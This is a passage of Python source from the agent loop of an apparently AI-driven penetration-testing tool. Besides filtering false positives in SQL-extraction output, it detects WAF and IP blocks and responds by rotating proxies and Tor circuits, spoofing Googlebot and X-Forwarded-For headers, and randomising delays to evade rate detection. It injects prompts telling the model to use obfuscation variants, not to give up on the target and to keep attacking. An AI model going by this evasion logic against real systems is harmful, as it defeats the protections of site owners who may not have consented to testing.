                r'(https?://|://|\.aspx|\.php|\.html?|\.jsp|\.do|'
                r'\.js|\.css|\.json|\.xml|\.asp|\.cfm|/[a-z])',
                _re.IGNORECASE
            )
            # v3.2.9: XML/HTML 태그 패턴 (<tag> 또는 </tag> 또는 <tag/>)
            _XML_TAG_PATTERN = _re.compile(r'^</?[a-zA-Z][a-zA-Z0-9_:\-]*[\s/>]?')
            # v3.2.9: 숫자/날짜/시간만으로 구성된 값 (SQL 데이터가 아님)
            # 수정: \Z는 [] 문자 클래스 안에서 사용 불가 → 제거 후 올바른 패턴으로 교체
            _NUMERIC_ONLY_PATTERN = _re.compile(
                r'^[-\d\s.+:T/,Z]+$'  # 0.80, 1.00, 2025-06-18T08:52:20+00:00 (하이픈 맨 앞)
            )
            # v3.2.9: JSON 구조 문자로 시작하는 라인
            _JSON_STRUCT_START = ('{', '}', '[', ']', '":', '",', '"}', '"]')
            # v3.2.27: JSON 필드 패턴 — API 응답 본문의 key-value 라인 오탐 방지
            # '"message": "unknown"', '"code": 0', '"status": "ok"' 등이 루프 감지에 걸리는 문제
            _JSON_FIELD_PATTERN = _re.compile(r'^"[a-zA-Z_][a-zA-Z0-9_]*"\s*:')
            # v5.1.4: HTTP 상태+크기 패턴 — "200 458B", "404 1997B" 등은 SQL 데이터가 아님
            # bash 스크립트가 curl 결과를 "STATUS SIZEb" 형식으로 출력할 때 오탐 방지
            _HTTP_STATUS_SIZE_PATTERN = _re.compile(
                r'^\d{3}\s+\d+[BbKkMmGg]?[Bb]?$'  # "200 458B", "404 1997B", "200 43kb"
            )
            # v5.1.4: 파일 크기 줄 패턴 — "  458 /tmp/klia_true.txt" 같은 wc -c 출력
            _FILE_SIZE_LINE_PATTERN = _re.compile(
                r'^\s*\d+\s+/tmp/'  # "  458 /tmp/foo.txt" → wc -c 결과
            )

            _lines = trimmed.split("\n")
            _table_lines = []
            for _l in _lines:
                _ls = _l.strip()
                if not _ls:
                    continue
                # 구분자/헤더/타이머 라인 제외
                # v3.2.12: 이모지 분석 출력(✅❌⚠️🔍🔄🔧💡📊📋💰🚨🎯) → SQL 데이터 아님
                if _ls.startswith((
                    "[", "⏱", "=", "步", "表", "---", ">>>", "<<<", "#",
                    # 이모지 접두어 (bingo 분석 출력, SQL 추출값 아님)
                    "✅", "❌", "⚠", "⚡", "🔍", "🔄", "🔧", "💡", "📊",
                    "📋", "💰", "🚨", "🎯", "🌐", "📝", "🔒", "💬", "🛠",
                    "🔐", "🗂", "🔑", "📌", "⛔", "🔁", "📡", "🧪", "🏁",
                    "🚩", "💻", "📤", "📥", "🔗", "🔺", "🔻", "⬆", "⬇",
                    # 한국어/중국어 분석 진행 마커
                    "결과:", "완료:", "시작:", "종료:", "탐지:", "수집:",
                    # v3.2.17: HTTP 응답 바디/메서드 접두어
                    "Body:", "body:", "<!DOCTYPE", "<!doctype",
                    "<html", "<HTML", "<head", "<HEAD",
                )):
                    continue
                # v3.2.9: XML/HTML 태그로 시작하는 라인 제외 (<url>, <loc>, <div> 등)
                if _XML_TAG_PATTERN.match(_ls):
                    continue
                # v3.2.9+v3.2.27: JSON 구조/필드 라인 제외
                # - 구조 문자 ({, }, [, ], ":, 등) 시작/끝
                # - "key": value 형태 JSON 필드 ("message": "unkn" 오탐 방지)
                if (
                    _ls.startswith(_JSON_STRUCT_START)
                    or _ls.endswith(('{', '}', '[', ']', '","', '",'))
                    or _JSON_FIELD_PATTERN.match(_ls)
                ):
                    continue
                # UI/분석 출력 접두어 라인 제외 ("消息: alert", "URL: index.aspx" 같은 것)
                if any(_ls.lower().startswith(p.lower()) for p in _UI_PREFIXES):
                    continue
                # 4글자 이하 단어나 흔한 UI 키워드이면 제외
                _val = _ls.split(":", 1)[-1].strip() if ":" in _ls else _ls
                _val_lower = _val.lower()
                if _val_lower in _UI_KEYWORDS or len(_val_lower) <= 4:
                    continue
                # v3.2.7: URL/파일경로 패턴 값이면 SQL 데이터 아님 → 제외
                if _URL_PATTERN.search(_val):
                    continue
                # v3.2.9: 숫자/날짜/시간만으로 구성된 값 제외 (XML priority, lastmod 등)
                if _NUMERIC_ONLY_PATTERN.match(_val):
                    continue
                # v5.1.4: HTTP 상태+크기 출력 제외 ("200 458B", "404 1997B" 등)
                # bash 스크립트가 curl 결과를 "STATUS SIZEb" 형식으로 출력 → SQL 데이터 아님
                if _HTTP_STATUS_SIZE_PATTERN.match(_val):
                    continue
                # v5.1.4: wc -c 파일 크기 출력 제외 ("  458 /tmp/klia_true.txt" 등)
                if _FILE_SIZE_LINE_PATTERN.match(_ls):
                    continue
                # v3.2.9: 값 자체가 XML/HTML 태그 형태이면 제외
                if _XML_TAG_PATTERN.match(_val):
                    continue
                # ── v3.2.28: 양성(화이트리스트) 필터 레이어 ─────────────────────
                # 블랙리스트 방식은 새 패턴이 나올 때마다 재발 → 양성 조건도 함께 적용
                #
                # 조건1: 길이 제한 — 150자 초과는 SQL 추출값이 아닌 로그/상태 라인
                if len(_ls) > 150:
                    continue
                # 조건2: 구조적 문자 시작 — JSON 문자열 리터럴("key"), 코드 블록 등 제외
                # '"message": "unknown"' 같은 JSON 본문이 _JSON_FIELD_PATTERN을 통과해도 여기서 차단
                if _ls and _ls[0] in ('"', "'", '`', '(', ')'):
                    continue
                # 조건3: 상태/오류 키워드 포함 — 스크립트 실행 메시지이지 DB값이 아님
                # "connection refused", "unknown error", "connection aborted" 등 반복 출력 오탐 방지
                _ls_lc2 = _ls.lower()
                if any(_kw in _ls_lc2 for _kw in _LOOP_STATUS_KEYWORDS):
                    continue
                # ────────────────────────────────────────────────────────────────
                _table_lines.append(_ls)

            if len(_table_lines) >= 6:
                _last_five = _table_lines[-5:]
                if len(set(_last_five)) == 1:  # 마지막 5줄이 모두 동일한 의미있는 값
                    _dup_val = _last_five[0]
                    _dup_val_lower = _dup_val.lower()
                    # v3.6.6: WAF 차단 응답 오탐 방지
                    # "Response (403): <!DOCTYPE html>" 같은 HTTP 에러 응답이
                    # 여러 페이로드에서 동일하게 반복될 때 루프 오탐 방지
                    # 실제 SQL 데이터 루프는 HTTP 에러 페이지가 아닌 DB 레코드값을 반복함
                    _is_waf_response = (
                        _dup_val_lower.startswith("response (")          # Response (403): ...
                        or _dup_val_lower.startswith("status=4")          # status=403, status=404
                        or _dup_val_lower.startswith("status=5")          # status=500, status=503
                        or "<!doctype" in _dup_val_lower                  # HTML 에러 페이지
                        or "<html" in _dup_val_lower                      # HTML 본문
                        or "error 40" in _dup_val_lower                   # "Error 403 (Forbidden)"
                        or "error 50" in _dup_val_lower                   # "Error 503 ..."
                        or "forbidden" in _dup_val_lower                  # HTTP 403 Forbidden
                        or "not found" in _dup_val_lower                  # HTTP 404 Not Found
                        # v5.1.4: HTTP 상태+크기 패턴 이중 방어 — "200 458B", "404 1997B"
                        or _HTTP_STATUS_SIZE_PATTERN.match(_dup_val)      # "200 458B" 등
                        # v5.1.4: wc -c 파일 크기 출력 이중 방어
                        or _FILE_SIZE_LINE_PATTERN.match(_dup_val)        # "  458 /tmp/..."
                    )
                    if _is_waf_response:
                        # WAF 차단: 루프 오탐이므로 TOP 1 힌트 없이 스킵
                        _waf_loop_fp_msg = t(
                            "loop_fp_waf_block",
                            "⚡ Loop false-positive skipped: repeated '{name}' is WAF block response — not SQL data loop."
                        ).replace("{name}", _dup_val[:60])
                        self.console.print(f"[dim]{_waf_loop_fp_msg}[/]")
                    # v6.2.44: 반복 경고 메시지 비활성화 (사용자 요청)

            if _detected_blocks:
                _wait_secs = 15
                # 타임아웃만 감지된 경우 WAF 드롭으로 명시
                _is_timeout_only = all("timeout" in b.lower() or "drop" in b.lower() for b in _detected_blocks)
                if _is_timeout_only:
                    _wait_secs = 5  # 타임아웃은 짧게 대기

                _lang = getattr(self.config, "lang", "en")

                # ── v3.2.18: 프록시 자동 로테이션 ─────────────────────────
                _proxy_hint_lines: list[str] = []
                _pm = self._proxy
                if _pm.enabled:
                    _new_entry = _pm.report_ban()
                    if _new_entry:
                        _proxy_rotate_msg = {
                            "ko": f"🔄 IP 밴 감지 → 프록시 자동 교체: {_new_entry}",
                            "zh": f"🔄 检测到IP封禁 → 自动切换代理: {_new_entry}",
                            "en": f"🔄 IP ban detected → auto-rotated proxy: {_new_entry}",
                        }.get(_lang, f"🔄 Proxy rotated → {_new_entry}")
                        self.console.print(f"[{THEME['success']}]{_proxy_rotate_msg}[/]")
                        _wait_secs = 3  # 프록시 교체 시 짧은 대기
                        _proxy_hint_lines = [
                            f"[PROXY_ROTATED: now using {_new_entry}]",
                            f"Add to your bash block:",
                            f"  PROXY=\"{_new_entry.url}\"",
                            f"  curl --proxy \"${{PROXY}}\" -sk -m 15 \"${{URL}}\"",
                        ]
                        if _new_entry.is_tor:
                            _proxy_hint_lines.append(
                                "  # Tor circuit rotation: echo -e 'AUTHENTICATE \"\"\\r\\nSIGNAL NEWNYM\\r\\nQUIT' | nc 127.0.0.1 9051"
                            )
                    else:
                        _proxy_warn = {
                            "ko": "⚠ 사용 가능한 프록시 소진 — /proxy add <url> 로 추가하거나 /proxy api 로 수집하세요",
                            "zh": "⚠ 代理池已耗尽 — 使用 /proxy add <url> 或 /proxy api 补充",
                            "en": "⚠ Proxy pool exhausted — add with /proxy add <url> or /proxy api",
                        }.get(_lang, "⚠ Proxy pool exhausted")
                        self.console.print(f"[{THEME['warn']}]{_proxy_warn}[/]")
                else:
                    # ── v3.3.4: 프록시 없을 때 silent drop → HTTP 헤더 우회 자동 적용 ──
                    _is_silent_drop = _has_timeout and not _has_429 and not _has_403
                    if _is_silent_drop:
                        # 헤더 우회 적용 안내 출력
                        _sd_msg = {
                            "ko": "🔀 Silent drop 감지 → HTTP 헤더 우회 자동 적용 (프록시 없음)",
                            "zh": "🔀 检测到静默丢弃 → 自动应用HTTP头部绕过 (无代理)",
                            "en": "🔀 Silent drop detected → applying HTTP header bypass (no proxy)",
                        }.get(_lang, "🔀 Silent drop → applying header bypass")
                        self.console.print(f"[{THEME['warn']}]{_sd_msg}[/]")
                        _sd_ua = {
                            "ko": "  • User-Agent → Googlebot 위장",
                            "zh": "  • User-Agent → 伪装为Googlebot",
                            "en": "  • User-Agent → spoofing as Googlebot",
                        }.get(_lang, "  • User-Agent → Googlebot")
                        _sd_xff = {
                            "ko": "  • X-Forwarded-For: 127.0.0.1 주입",
                            "zh": "  • X-Forwarded-For: 127.0.0.1 注入",
                            "en": "  • X-Forwarded-For: 127.0.0.1 injected",
                        }.get(_lang, "  • X-Forwarded-For: 127.0.0.1")
                        _sd_delay = {
                            "ko": "  • 딜레이 랜덤화: 3~7초 (패턴 탐지 회피)",
                            "zh": "  • 随机延迟: 3~7秒 (规避模式检测)",
                            "en": "  • Randomized delay: 3~7s (evade rate detection)",
                        }.get(_lang, "  • Delay: random 3~7s")
                        self.console.print(f"[{THEME['dim']}]{_sd_ua}[/]")
                        self.console.print(f"[{THEME['dim']}]{_sd_xff}[/]")
                        self.console.print(f"[{THEME['dim']}]{_sd_delay}[/]")
                        # AI에게 주입할 헤더 우회 힌트
                        import random as _rand
                        _ua_pool = [
                            "Googlebot/2.1 (+http://www.google.com/bot.html)",
                            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
                            "curl/7.68.0",
                        ]
                        _chosen_ua = _rand.choice(_ua_pool)
                        _chosen_delay = round(_rand.uniform(3.0, 7.0), 1)
                        _proxy_hint_lines = [
                            "[SILENT_DROP_HEADER_BYPASS_APPLIED: no proxy available]",
                            "CAUSE: WAF is silently dropping your request (timeout, no response body).",
                            "ACTION: Update your bash block curl command with ALL of the following headers:",
                            f"  curl -sk -m 15 \\",
                            f"    -H 'User-Agent: {_chosen_ua}' \\",
                            f"    -H 'X-Forwarded-For: 127.0.0.1' \\",
                            f"    -H 'X-Real-IP: 127.0.0.1' \\",
                            f"    -H 'True-Client-IP: 127.0.0.1' \\",
                            f"    -H 'Referer: https://www.google.com/' \\",
                            f"    -H 'Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8' \\",
                            f"    \"${{URL}}\"",
                            f"  # ADD between requests: sleep {_chosen_delay}  # randomized delay",
                            "If still blocked after 2 retries → use /proxy add <url> or /proxy tor",
                        ]
                        _wait_secs = max(_wait_secs, 6)  # silent drop은 좀 더 대기
                    else:
                        # 일반 차단 (타임아웃 아님) — 기존 힌트 출력
                        _proxy_hint_msg = {
                            "ko": "💡 팁: /proxy add <url> 또는 /proxy tor 로 IP 밴 자동 우회 가능",
                            "zh": "💡 提示: 使用 /proxy add <url> 或 /proxy tor 自动绕过IP封禁",
                            "en": "💡 Tip: /proxy add <url> or /proxy tor to auto-rotate past IP bans",
                        }.get(_lang, "💡 Tip: /proxy add <url> to auto-rotate")
                        self.console.print(f"[{THEME['dim']}]{_proxy_hint_msg}[/]")

                _block_msg = {
                    "ko": f"⛔ 차단 감지: {', '.join(_detected_blocks)} — {_wait_secs}초 대기 후 재시도...",
                    "zh": f"⛔ 检测到封锁: {', '.join(_detected_blocks)} — 等待 {_wait_secs} 秒后重试...",
                    "en": f"⛔ Block detected: {', '.join(_detected_blocks)} — waiting {_wait_secs}s before retry...",
                }.get(_lang, f"⛔ Block detected — waiting {_wait_secs}s...")
                self.console.print(f"[{THEME['warn']}]{_block_msg}[/]")
                import time as _time
                # 대기 중 카운트다운 표시
                for _i in range(_wait_secs, 0, -5):
                    _time.sleep(min(5, _i))
                    self.console.print(f"[{THEME['dim']}]  {self.s.get('countdown_remain', '⏱ {sec}s remaining...').format(sec=_i)}[/]")

                _proxy_inject = "\n".join(_proxy_hint_lines)
                _ip_block_hint = (
                    f"\n[IP_BLOCK_DETECTED: {', '.join(_detected_blocks)}]\n"
                    + (_proxy_inject + "\n" if _proxy_inject else "")
                    + f"Waited {_wait_secs}s. Now retry with:\n"
                    f"  - Different User-Agent string\n"
                    f"  - X-Forwarded-For: 8.8.8.8 header\n"
                    f"  - Reduce request rate (add time.sleep(2) between requests)\n"
                    f"  - If timeout/WAF-drop: try chunked Transfer-Encoding or smaller payloads\n"
                    f"  - Try a different endpoint or parameter\n"
                    f"  - If CAPTCHA: look for API endpoint that bypasses frontend\n"
                )

            _next_action_contract = (
                "NEXT ACTION: Treat ADAPTIVE_OFFENSE_PIVOT as an AI-led advisory. "
                "Prefer a non-SQLi vector after repeated blocked controls, unless you can state "
                "the new SQLi/WAF hypothesis and execute one distinct bounded verifier. "
                "Do not repeat the same blocked request.\n"
                if adaptive_pivot_context and "next=cross_vector" in adaptive_pivot_context
                else (
                    "NEXT ACTION: Continue from where you left off. "
                    "DO NOT re-extract already known facts above. "
                    "Proceed to the next unknown step.\n"
                )
            )
            injection = (
                "=== BINGO REAL EXECUTION RESULTS ===\n"
                + trimmed
                + _ip_block_hint
                + _waf_redirect_note
                + "\n=== END REAL RESULTS ===\n\n"
                + state_summary
                + _next_action_contract
                + "- If WAF blocks: use obfuscation variants\n"
                "- Output TASK_COMPLETE only when the requested scope is complete; "
                "confirmed vulnerabilities still require Finding-ID evidence\n"
                "- NEVER generate simulated output"
            )
            self.history.append(Message(role="user", content=injection))

            model_cfg = self.config.get_active_model_config()
            if not model_cfg:
                break

            _s = self.s

            # Ctrl+C 체크 — 힌트 주입 후 계속 가능
            # v6.2.137: LOOP_LIMIT_STOP은 hint 없이 즉시 break
            if self._agent_stop_flag.is_set():
                self._agent_stop_flag.clear()
                if getattr(self, "_loop_limit_hit", False):
                    self._loop_limit_hit = False
                    self._exec_loop_count = 0
                    _report_msg = self.s.get(
                        "loop_limit_report_start",
                        "Loop stopped — generating the final report now",
                    )
                    self.console.print(f"\n[{THEME['warn']}]{_report_msg}[/]")
                    self._auto_generate_report()
                    break
                _hint = self._prompt_mid_task_hint()
                if _hint:
                    # 힌트를 히스토리에 주입하고 루프 계속
                    _lang = getattr(self.config, "lang", "en")
                    _hint_injected = {
                        "ko": f"[사용자 힌트 — 즉시 반영]: {_hint}",
                        "zh": f"[用户提示 — 立即应用]: {_hint}",
                        "en": f"[USER HINT — apply immediately]: {_hint}",
                    }.get(_lang, f"[USER HINT]: {_hint}")
                    self.history.append(Message(role="user", content=_hint_injected))
                    _resume_msg = {
                        "ko": f"💬 힌트 주입됨 — 루프 재개 (#{self._exec_loop_count})",
                        "zh": f"💬 提示已注入 — 继续循环 (#{self._exec_loop_count})",
                        "en": f"💬 Hint injected — resuming loop (#{self._exec_loop_count})",
                    }.get(_lang, f"💬 Hint injected — resuming")
                    self.console.print(f"[{THEME['success']}]{_resume_msg}[/]\n")
                    # 다음 AI 호출 전까지 결과 주입 없이 바로 AI에게 힌트 전달
                    model_hint = ModelRegistry.build(model_cfg)
                    _hint_response = self._stream_response(
                        model_hint.chat_stream(self._build_messages(""))
                    )
                    if _hint_response:
                        self.history.append(Message(role="assistant", content=_hint_response))
                        self._append_to_session_log("assistant", _hint_response)
                        # ★ current_response 업데이트 — 힌트 기반 AI 응답을 다음 루프에서 처리
                        current_response = _hint_response
                    continue
                else:
                    self.console.print(f"\n[{THEME['warn']}]⚠ {_s.get('agent_interrupted', 'Agent loop interrupted')}[/]\n")
                    self._suggest_next_steps()
                    break


            # AI 피드백
            model = ModelRegistry.build(model_cfg)
            self.console.print(f"\n[{THEME['secondary']}]{_s['exec_analyzing']}[/]")
            followup_response = self._stream_response(
                model.chat_stream(self._build_messages(""))
            )

            if not followup_response:
                # API 응답 없음 → 잠시 대기 후 재시도
                import time as _t
                _t.sleep(3)
                model_cfg3 = self.config.get_active_model_config()
                if not model_cfg3:
                    break
                from ..models.registry import ModelRegistry as _MR3
                _m3 = _MR3.build(model_cfg3)
                followup_response = self._stream_response(
                    _m3.chat_stream(self._build_messages(""))
                )
                if not followup_response:
                    break  # 재시도도 실패하면 종료

            _evidence_counts_post = BingoTerminal._finding_evidence_counts(
                getattr(self, "_findings_exporter", None)
            )
            _sanitized_followup = BingoTerminal._sanitize_runtime_claims_by_evidence(
                followup_response,
                getattr(self, "_findings_exporter", None),
            )
            if _sanitized_followup != followup_response:
                _claim_fix_msg = {
                    "ko": "⚠ 확정 표현을 evidence ledger 기준으로 자동 강등했습니다.",
                    "zh": "⚠ 已按 evidence ledger 自动降级未证实的确认表述。",
                    "en": "⚠ Unsupported confirmation wording was downgraded by the evidence ledger.",
                }.get(getattr(self.config, "lang", "en"), "⚠ Unsupported confirmation wording downgraded.")
                self.console.print(f"\n[{THEME['warn']}]{_claim_fix_msg}[/]")
                followup_response = _sanitized_followup

            self.history.append(Message(role="assistant", content=followup_response))
            self._append_to_session_log("assistant", followup_response)
            # v6.2.147: 루프 내부에서는 수집만 (스레드 시작 안 함 → 인터리빙 방지)
            # 크랙은 _execute_ai_commands 완료 후 send_message()의 _notify_hashes_found()에서 실행
            self._collect_crack_hashes(followup_response)

            # ── v4.5.0: 실행 후 LLM 분석에서 CONFIRMED/FALSE POSITIVE 감지 ────────
            # 모델의 CONFIRMED 문구 자체는 증거가 아니다. 로컬 Finding ledger가
            # confirmed일 때만 확정 표시하고, 아니면 probable/potential로 강등한다.
            import re as _re_fp_post
            _followup_lang = getattr(self.config, "lang", "en")
            if _re_fp_post.search(r'\[CONFIRMED\s*✅?\]', followup_response):
                if _evidence_counts_post.get("confirmed", 0) > 0:
                    _conf_post = {
                        "ko": "✅ [CONFIRMED] — Finding ID 기준 확정 증거 있음",
                        "zh": "✅ [CONFIRMED] — Finding ID 证据已确认",
                        "en": "✅ [CONFIRMED] — Confirmed Finding-ID evidence exists",
                    }.get(_followup_lang, "✅ Confirmed Finding-ID evidence exists.")
                    self.console.print(f"\n[bold green]{_conf_post}[/bold green]")
                else:
                    _conf_post = {
                        "ko": "⚠ [PROBABLE] — 모델 확정 문구가 있었지만 confirmed Finding ID가 없습니다.",
                        "zh": "⚠ [PROBABLE] — 模型写了确认，但没有 confirmed Finding ID。",
                        "en": "⚠ [PROBABLE] — Model claimed confirmation, but no confirmed Finding ID exists.",
                    }.get(_followup_lang, "⚠ Probable only; no confirmed Finding ID.")
                    self.console.print(f"\n[bold yellow]{_conf_post}[/bold yellow]")
            elif _re_fp_post.search(r'\[FALSE\s*POSITIVE\s*❌?\]', followup_response):
                _fp_post = {
                    "ko": "❌ [FALSE POSITIVE] — 실행결과 기반 오탐 확인됨",
                    "zh": "❌ [FALSE POSITIVE] — 基于执행결果，误报확인",
                    "en": "❌ [FALSE POSITIVE] — Confirmed false positive from execution",
                }.get(_followup_lang, "❌ False positive.")
                self.console.print(f"\n[bold red]{_fp_post}[/bold red]")

            # 작업 완료
            if "TASK_COMPLETE" in followup_response or "MISSION_COMPLETE" in followup_response:
                _done_counts = BingoTerminal._finding_evidence_counts(
                    getattr(self, "_findings_exporter", None)
                )
                _defer_done_reason = BingoTerminal._auto_report_defer_reason(
                    followup_response,
                    _done_counts,
                    getattr(self, "_exec_loop_count", 0),
                    trigger="task_complete",
                )
                if _defer_done_reason:
                    _auto_report_defer_count += 1
                    _lang = getattr(self.config, "lang", "en")
                    _defer_done_msg = {
                        "ko": (
                            "⏳ TASK_COMPLETE 무시 — 자동 보고서 보류: "
                            f"{_defer_done_reason}. 다음 실제 검증을 계속합니다."
                        ),
                        "zh": (
                            "⏳ 已忽略 TASK_COMPLETE — 自动报告延后: "
                            f"{_defer_done_reason}. 继续执行下一步真实验证。"
                        ),
                        "en": (
                            "⏳ TASK_COMPLETE ignored — auto report deferred: "
                            f"{_defer_done_reason}. Continuing real verification."
                        ),
                    }.get(_lang, f"⏳ TASK_COMPLETE ignored: {_defer_done_reason}.")
                    self.console.print(f"\n[{THEME['warn']}]{_defer_done_msg}[/]\n")
                    self.history.append(Message(
                        role="user",
                        content=(
                            "[AUTO_REPORT_DEFERRED]\n"
                            f"Reason: {_defer_done_reason}\n"
                            "Do not emit TASK_COMPLETE again until there is confirmed/probable/potential "
                            "Finding-ID evidence or the user explicitly asks for a report.\n"
                            "If you already included a TOOL_CALL or code block above, continue from it. "
                            "Otherwise emit one concrete executable next action now."
                        ),
                    ))
                    if _auto_report_defer_count >= 4:
                        self._suggest_next_steps()
                        break
                    current_response = followup_response
                    continue
                if _done_counts.get("confirmed", 0) > 0:
                    self.console.print(
                        f"\n[{THEME['success']}]✅ {_s.get('agent_done', 'Agent task complete')}[/]\n"
                    )
                else:
                    _no_confirm_done = {
                        "ko": (
                            "⚠ TASK_COMPLETE 수신 — confirmed Finding ID는 없습니다. "
                            "현재 증거 기준으로 미확정/후보 보고서를 생성합니다."
                        ),
                        "zh": (
                            "⚠ 收到 TASK_COMPLETE — 没有 confirmed Finding ID。"
                            "将基于当前证据生成未确认/候选报告。"
                        ),
                        "en": (
                            "⚠ TASK_COMPLETE received — no confirmed Finding ID exists. "
                            "Generating an unconfirmed/candidate evidence report."
                        ),
                    }.get(getattr(self.config, "lang", "en"), "⚠ TASK_COMPLETE received without confirmed evidence.")
                    self.console.print(f"\n[{THEME['warn']}]{_no_confirm_done}[/]\n")
                _target = self._agent_state.get("target") or "target"
                _lang = getattr(self.config, "lang", "en")
                _notif_title = {"ko": "BINGO — 작업 완료", "zh": "BINGO — 任务完成", "en": "BINGO — Task Complete"}.get(_lang, "BINGO — Done")
                _t40 = str(_target)[:40]
                _notif_body = {"ko": f"침투 테스트 완료: {_t40}", "zh": f"渗透测试完成: {_t40}", "en": f"Pentest complete: {_t40}"}.get(_lang, f"Done: {_t40}")
                self._send_notification(_notif_title, _notif_body, critical=False)
                self._auto_generate_report()
                break

            # 타겟 실패 감지 — 더 이상 진행 불가
            if "TARGET_FAILED" in followup_response:
                _lang = getattr(self.config, "lang", "en")

                # ── v6.2.94: VPN 가상 IP 오판 감지 — TARGET_FAILED 전에 체크 ──
                import re as _re_vpn
                from bingo.tools_ext.pentest_tools import (
                    _is_vpn_virtual_ip, _get_real_ip_via_external_dns
                )
                _resp_ips = _re_vpn.findall(r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b", followup_response)
                _vpn_ips_found = [ip for ip in _resp_ips if _is_vpn_virtual_ip(ip)]
                if _vpn_ips_found:
                    _url_m2 = _re_vpn.search(r"https?://([a-zA-Z0-9._-]+)", followup_response)
                    _hn2 = _url_m2.group(1) if _url_m2 else None
                    _real_ip2 = None
                    if _hn2:
                        try:
                            _real_ip2 = _get_real_ip_via_external_dns(_hn2)
                        except Exception:
                            pass
                    _vpn_warn = {
                        "ko": (
                            f"⚠️  VPN 가상 IP 감지: {', '.join(set(_vpn_ips_found))}\n"
                            f"이 IP는 VPN(Clash/Surge)이 만든 가상 라우팅 주소입니다.\n"
                            f"실제 서버 IP가 아니므로 'IP 차단' 결론은 오판일 수 있습니다.\n"
                            + (f"외부 DNS 조회 실제 IP: {_real_ip2}" if _real_ip2 else "")
                        ),
                        "zh": (
                            f"⚠️  检测到VPN虚拟IP: {', '.join(set(_vpn_ips_found))}\n"
                            f"此IP是VPN(Clash/Surge)创建的虚拟路由地址，并非真实服务器IP。\n"
                            f"因此'IP被封锁'的结论可能是误判。\n"
                            + (f"外部DNS查询真实IP: {_real_ip2}" if _real_ip2 else "")
                        ),
                        "en": (
                            f"⚠️  VPN virtual IP detected: {', '.join(set(_vpn_ips_found))}\n"
                            f"This IP is a virtual routing address created by VPN (Clash/Surge), not the real server IP.\n"
                            f"The 'IP blocked' conclusion may be incorrect.\n"
                            + (f"Real IP via external DNS: {_real_ip2}" if _real_ip2 else "")
                        ),
                    }.get(_lang, f"⚠️  VPN virtual IP: {', '.join(set(_vpn_ips_found))}")
                    from rich.panel import Panel as _PanelV
                    _vpn_title = self.s.get(
                        "vpn_virtual_ip_title",
                        "VPN_VIRTUAL_IP — false-positive warning",
                    )
                    self.console.print(_PanelV(
                        _vpn_warn,
                        title=f"[bold yellow]{_vpn_title}[/bold yellow]",
                        border_style="yellow",
                    ))
                    # VPN 가상 IP 오판이면 TARGET_FAILED로 중단하지 않고 루프 계속
                    _vpn_hint = {
                        "ko": (
                            "[VPN_VIRTUAL_IP 자동 교정] "
                            f"감지된 IP {', '.join(set(_vpn_ips_found))}는 VPN 가상 IP입니다. "
                            f"실제 서버 IP: {_real_ip2 or '외부 DNS로 dig @8.8.8.8 확인 필요'}. "
                            f"URL은 도메인 {_hn2 or ''}로 유지하고, 필요하면 curl --resolve 로 전송 IP만 고정하세요. "
                            "IP 차단이 아닙니다 — 계속 침투 시도하세요."
                        ),
                        "zh": (
                            "[VPN_VIRTUAL_IP自动校正] "
                            f"检测到IP {', '.join(set(_vpn_ips_found))}为VPN虚拟IP。"
                            f"真实服务器IP: {_real_ip2 or '需通过dig @8.8.8.8查询'}。"
                            f"URL保持域名{_hn2 or ''}，必要时只用curl --resolve固定传输IP。"
                            "这不是IP封锁——请继续渗透测试。"
                        ),
                        "en": (
                            "[VPN_VIRTUAL_IP auto-corrector] "
                            f"Detected IP {', '.join(set(_vpn_ips_found))} is a VPN virtual IP. "
                            f"Real server IP: {_real_ip2 or 'check with dig @8.8.8.8'}. "
                            f"Keep the URL on domain {_hn2 or ''}; if needed, pin only the transport IP with curl --resolve. "
                            "This is NOT an IP block — continue penetration testing."
                        ),
                    }.get(_lang, f"[VPN_VIRTUAL_IP] Not IP blocked. Real IP: {_real_ip2}")
                    self.history.append(Message(role="user", content=_vpn_hint))
                    continue  # TARGET_FAILED 중단 없이 루프 재개

                # ── v6.2.97: 일시적 WAF 행동 차단 감지 — TARGET_FAILED 전에 체크 ──
                # 이전에 STATUS:200 성공한 타겟이 STATUS:000으로 변한 경우 = 일시적 차단
                import re as _re_wtb
                _full_hist = " ".join(
                    m.content for m in self.history[-30:]  # 최근 30개 메시지
                    if hasattr(m, "content") and m.content
                )
                _had_200 = bool(_re_wtb.search(r"---HTTP_STATUS:200---", _full_hist))
                _has_000_now = bool(_re_wtb.search(r"---HTTP_STATUS:000---", followup_response))
                _http_direct_fail = bool(_re_wtb.search(
                    r"http://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/.*STATUS:000",
                    followup_response + _full_hist
                ))
                if (_had_200 and _has_000_now) or _http_direct_fail:
                    _url_m3 = _re_wtb.search(r"https?://[a-zA-Z0-9._/-]+", followup_response)
                    _target_url = _url_m3.group(0).rstrip(".,") if _url_m3 else "<URL>"
                    _domain3 = _re_wtb.search(r"https?://([a-zA-Z0-9._-]+)", _target_url)
                    _dn3 = _domain3.group(1) if _domain3 else "<domain>"
                    _wtb_warn = {
                        "ko": (
                            "[WAF_TEMP_BLOCK 자동 교정] "
                            "이전에 STATUS:200 성공 기록 있음 → 서버는 살아있습니다. "
                            "현재 STATUS:000은 WAF 스캐닝 감지 후 일시적 차단입니다. "
                            "서버가 다운되거나 IP가 영구 차단된 게 아닙니다. "
                            "45초 대기 후 다시 시도하고, HTTP가 아닌 HTTPS로 접근하세요. "
                            "TARGET_FAILED 결론 내리지 말고 계속 침투 시도하세요."
                        ),
                        "zh": (
                            "[WAF_TEMP_BLOCK自动校正] "
                            "之前STATUS:200成功记录存在 → 服务器是活的。"
                            "当前STATUS:000是WAF检测到扫描行为后的临时封锁，不是服务器下线或IP永久封禁。"
                            "等待45秒后重试，使用HTTPS而非HTTP访问。"
                            "不要得出TARGET_FAILED结论——继续渗透测试。"
                        ),
                        "en": (
                            "[WAF_TEMP_BLOCK auto-corrector] "
                            "Previous STATUS:200 success record exists → server is alive. "
                            "Current STATUS:000 is temporary WAF behavioral blocking after scan detection, "
                            "NOT server down or permanent IP ban. "
                            "Wait 45 seconds and retry with HTTPS (not HTTP). "
                            "Do NOT conclude TARGET_FAILED — continue penetration testing."
                        ),
                    }.get(_lang, "[WAF_TEMP_BLOCK] Server alive, temporary WAF block. Retry with HTTPS after 45s.")
